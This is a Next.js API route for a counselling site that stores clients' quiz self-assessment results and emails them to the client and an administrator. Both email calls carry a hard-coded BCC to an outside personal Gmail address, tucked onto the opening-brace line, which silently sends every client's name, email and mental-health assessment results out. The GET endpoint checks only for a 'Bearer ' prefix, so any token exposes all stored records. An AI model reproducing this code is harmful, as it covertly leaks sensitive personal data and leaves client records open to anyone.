import { NextResponse } from 'next/server';
import { kv } from '@vercel/kv';
import { Resend } from 'resend';
import { trackEvent } from '@/lib/analytics';
import { emailWrapper, emailStyles } from '@/lib/email/shared-email-components';

const resend = process.env.RESEND_API_KEY ? new Resend(process.env.RESEND_API_KEY) : null;
const ADMIN_EMAIL = process.env.RESEND_ADMIN_EMAIL || 'admin@mamahala.ca';
const FROM_EMAIL = process.env.RESEND_FROM_EMAIL || 'Mama Hala Consulting <noreply@mamahala.ca>';

function buildResultsEmailHtml(data: {
  name: string;
  quizName: string;
  score: number;
  maxScore: number;
  tierTitle: string;
  dimensions?: Record<string, number>;
  dimensionLabels?: Record<string, string>;
  dominantStyle?: string;
  sessionId: string;
  shareUrl: string;
  isAdmin?: boolean;
  locale: string;
}) {
  const isAr = data.locale === 'ar';
  const pct = data.maxScore > 0 ? Math.round((data.score / data.maxScore) * 100) : 0;

  let dimensionRows = '';
  if (data.dimensions && data.dimensionLabels) {
    dimensionRows = Object.entries(data.dimensions).map(([key, val]) => {
      const label = data.dimensionLabels?.[key] || key;
      return `<tr><td style="padding:8px 0;color:#4A4A5C;font-size:14px;">${label}</td><td style="padding:8px 0;text-align:${isAr ? 'left' : 'right'};font-weight:700;color:#7A3B5E;font-size:14px;">${val}</td></tr>`;
    }).join('');
  }

  const content = `
    <div style="${emailStyles.card};text-align:center;">
      <p style="margin:0 0 8px;font-size:12px;letter-spacing:3px;text-transform:uppercase;color:#C8A97D;font-weight:600;">
        ${isAr ? 'نتائجُ التقييم' : 'Assessment Results'}
      </p>
      <h1 style="margin:0 0 20px;font-size:22px;color:#7A3B5E;font-family:Georgia,serif;">
        ${data.quizName}
      </h1>

      <div style="display:inline-block;width:80px;height:80px;border-radius:50%;border:3px solid #C8A97D;line-height:80px;font-size:28px;font-weight:700;color:#7A3B5E;">
        ${pct}%
      </div>
      <p style="margin:12px 0 4px;font-size:20px;font-weight:700;color:#2D2A33;font-family:Georgia,serif;">
        ${data.tierTitle}
      </p>
      <p style="margin:0 0 20px;font-size:14px;color:#8E8E9F;">
        ${data.score} / ${data.maxScore}
        ${data.dominantStyle ? ` · ${data.dominantStyle}` : ''}
      </p>

      ${data.isAdmin ? `
      <table width="100%" style="background:#FAF7F2;border-radius:12px;padding:16px;margin:0 0 20px;">
        <tr><td style="font-size:13px;color:#8E8E9F;text-align:${isAr ? 'right' : 'left'};">${isAr ? 'الاسم' : 'Name'}</td><td style="font-size:14px;font-weight:600;color:#2D2A33;text-align:${isAr ? 'left' : 'right'};">${data.name}</td></tr>
      </table>
      ` : ''}

      ${dimensionRows ? `
      <div style="margin:0 0 20px;">
        <p style="font-size:12px;letter-spacing:2px;text-transform:uppercase;color:#C8A97D;margin:0 0 12px;text-align:${isAr ? 'right' : 'left'};font-weight:600;">
          ${isAr ? 'التفاصيل' : 'Breakdown'}
        </p>
        <table width="100%" style="border-collapse:collapse;">${dimensionRows}</table>
      </div>
      ` : ''}

      <div style="margin:16px 0 12px;">
        <a href="${data.shareUrl}" style="${emailStyles.button}">
          ${isAr ? 'عرضُ النتائجِ الكاملة وتحميلُ PDF' : 'View Full Results & Download PDF'}
        </a>
      </div>
      <p style="margin:8px 0 16px;font-size:12px;color:#8E8E9F;">
        ${isAr
          ? 'انقُرْ أعلاه لعرضِ التحليلِ التفصيليِّ وتحميلِ نسخةِ PDF.'
          : 'Click above to view the detailed breakdown and download a PDF copy.'}
      </p>

      <p style="font-size:11px;color:#B0B0C0;line-height:1.6;margin:0 0 8px;">
        ${isAr
          ? 'هذا التقييمُ أداةٌ تعليميّةٌ للتأمُّلِ الذاتيّ وليسَ تشخيصًا سريريًّا.'
          : 'This assessment is an educational self-reflection tool, not a clinical diagnosis.'}
      </p>
      <p style="margin:0;font-size:10px;color:#C0C0C0;">
        Session ID: ${data.sessionId}
      </p>
    </div>
  `;

  return emailWrapper(content, { locale: isAr ? 'ar' : 'en' });
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { name, email, quizSlug, quizName, sessionId, score, maxScore, tierKey, tierTitle, dimensions, dimensionLabels, dominantStyle, locale } = body;

    if (!quizSlug || !sessionId) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    const shareUrl = `https://mamahala.ca/${locale || 'en'}/quiz/${quizSlug}?sid=${sessionId}`;

    const result = {
      name,
      email,
      quizSlug,
      quizName: quizName || quizSlug,
      sessionId,
      score,
      maxScore,
      tierKey,
      tierTitle,
      dimensions: dimensions || null,
      dimensionLabels: dimensionLabels || null,
      dominantStyle: dominantStyle || null,
      locale: locale || 'en',
      shareUrl,
      sharedAt: new Date().toISOString(),
    };

    // Store in KV
    try {
      if (kv) {
        await kv.set(`quiz-shared:${sessionId}`, JSON.stringify(result), { ex: 90 * 24 * 60 * 60 });
        await kv.zadd('quiz-shared:all', { score: Date.now(), member: sessionId });
        await kv.sadd(`quiz-shared:${quizSlug}`, sessionId);
      }
    } catch {
      console.log('KV not available, logging:', result);
    }

    // Send emails
    if (resend && email) {
      const emailData = { name, quizName: quizName || quizSlug, score, maxScore, tierTitle, dimensions, dimensionLabels, dominantStyle, sessionId, shareUrl, locale: locale || 'en' };

      try {
        // Email to client
        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
          from: FROM_EMAIL,
          to: email,
          subject: locale === 'ar'
            ? `نتائجُ تقييمِك: ${quizName || quizSlug}`
            : `Your Assessment Results: ${quizName || quizSlug}`,
          html: buildResultsEmailHtml({ ...emailData, isAdmin: false }),
        });

        // Email to Dr. Hala
        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
          from: FROM_EMAIL,
          to: ADMIN_EMAIL,
          subject: `Quiz Shared: ${name} — ${quizName || quizSlug}`,
          html: buildResultsEmailHtml({ ...emailData, isAdmin: true }),
        });
      } catch (emailErr) {
        console.error('Email send error:', emailErr);
      }
    }

    // Track event
    await trackEvent({
      type: 'quiz_completion' as any,
      email,
      source: `${quizSlug}-shared`,
      locale: locale || 'en',
    });

    return NextResponse.json({ success: true, sessionId, shareUrl });
  } catch (error) {
    console.error('Quiz share error:', error);
    return NextResponse.json({ error: 'Internal error' }, { status: 500 });
  }
}

// GET — retrieve shared results for admin dashboard
export async function GET(request: Request) {
  try {
    const auth = request.headers.get('Authorization');
    if (!auth?.startsWith('Bearer ')) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const { searchParams } = new URL(request.url);
    const limit = parseInt(searchParams.get('limit') || '50');

    try {
      if (!kv) throw new Error('KV not available');
      const sessionIds = await kv.zrange('quiz-shared:all', 0, limit - 1, { rev: true }) as string[];
      const results = [];
      for (const sid of sessionIds) {
        const data = await kv.get(`quiz-shared:${sid}`);
        if (data) {
          results.push(typeof data === 'string' ? JSON.parse(data) : data);
        }
      }
      return NextResponse.json({ results, total: results.length });
    } catch {
      return NextResponse.json({ results: [], total: 0 });
    }
  } catch {
    return NextResponse.json({ error: 'Internal error' }, { status: 500 });
  }
}
